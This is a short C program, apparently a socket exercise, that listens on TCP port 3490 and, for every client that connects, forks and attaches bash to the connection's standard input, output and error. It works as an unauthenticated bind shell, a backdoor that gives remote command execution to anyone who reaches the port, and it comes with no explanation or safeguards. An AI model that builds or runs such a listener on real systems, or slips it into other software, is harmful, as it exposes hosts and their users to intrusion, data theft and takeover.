#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main()
{
    struct addrinfo hints;
    struct addrinfo *servinfo;
    int status;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    if ((status = getaddrinfo(NULL, "3490", &hints, &servinfo)) !=0)
    {
        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
        exit(1);
    }

    if (servinfo == NULL)
    {
        printf("servinfo == NULL\n");
        exit(1);
    }

    int sockfd = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol);
    if (sockfd < 0)
    {
        perror("sockfd < 0");
        exit(1);
    }

    if (bind(sockfd, servinfo->ai_addr, servinfo->ai_addrlen) < 0)
    {
        perror("bind < 0");
        exit(1);
    }

    int yes = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) < 0)
    {
        perror("setsockopt < 0");
        exit(1);
    }

    if (listen(sockfd, 5) < 0)
    {
        perror("listen < 0");
        exit(1);
    }

    freeaddrinfo(servinfo);

    while (1)
    {
        int cfd = accept(sockfd, NULL, NULL);
        printf("accepted, %d\n", cfd);
        if (cfd < 0)
        {
            perror("fd < 0");
            continue;
        }
        int pid = fork();
        if (pid == 0)
        {
            close(sockfd);
            dup2(cfd, 0);
            dup2(cfd, 1);
            dup2(cfd, 2);
            close(cfd);
            execlp("bash", "bash", NULL);
            exit(0);
        }
        close(cfd);
    }
}






